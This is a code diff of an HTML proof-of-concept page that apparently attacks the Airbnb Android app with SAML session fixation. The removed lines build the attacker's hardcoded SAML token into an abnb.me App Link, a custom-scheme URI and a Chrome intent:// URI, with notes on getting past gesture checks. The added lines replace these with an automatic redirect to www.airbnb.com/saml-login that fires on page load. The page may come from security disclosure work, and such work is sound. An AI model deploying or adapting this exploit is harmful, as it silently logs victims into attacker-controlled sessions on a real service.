@@ -26,35 +26,10 @@
   <div class="loader"><span></span><span></span><span></span></div>
 </div>
 <script>
-  // Attacker's hardcoded SAML token — victim never sees or interacts with this
   var TOKEN = "6bihac4mstjga4k5ba2bncqif_A4W_SAML_FIXATION_PROOF";
-
-  // abnb.me is Airbnb's official App Link domain — Android opens the app directly
-  // This is also exactly what a real attacker would send as a "normal" link
-  var APP_LINK = "https://abnb.me/saml-login?saml_token=" + encodeURIComponent(TOKEN);
-
-  // Custom scheme fallback
-  var SCHEME   = "airbnb://saml-login?saml_token=" + encodeURIComponent(TOKEN);
-
-  // intent:// for Chrome (fires from touchstart to satisfy gesture requirement)
-  var INTENT   =
-    "intent://saml-login?saml_token=" + encodeURIComponent(TOKEN) +
-    "#Intent;scheme=airbnb;package=com.airbnb.android;" +
-    "S.browser_fallback_url=" + encodeURIComponent("https://www.airbnb.com") +
-    ";end";
-
-  // ── Method 1: redirect to abnb.me App Link (no gesture needed, no intent://) ──
-  // Android intercepts HTTPS navigations to abnb.me and opens Airbnb directly.
-  // Chrome cannot block this — it's a normal HTTPS redirect.
-  setTimeout(function() {
-    window.location.href = APP_LINK;
-  }, 300);
-
-  // ── Method 2: on real touch, fire intent:// which Chrome always allows ────────
-  document.addEventListener("touchstart", function(e) {
-    e.preventDefault();
-    window.location.href = INTENT;
-  }, { once: true, passive: false });
+  // www.airbnb.com is a verified App Link on Android — opens Airbnb directly, no dialog
+  var TARGET = "https://www.airbnb.com/saml-login?saml_token=" + encodeURIComponent(TOKEN);
+  setTimeout(function() { window.location.href = TARGET; }, 300);
 </script>
 </body>
 </html>
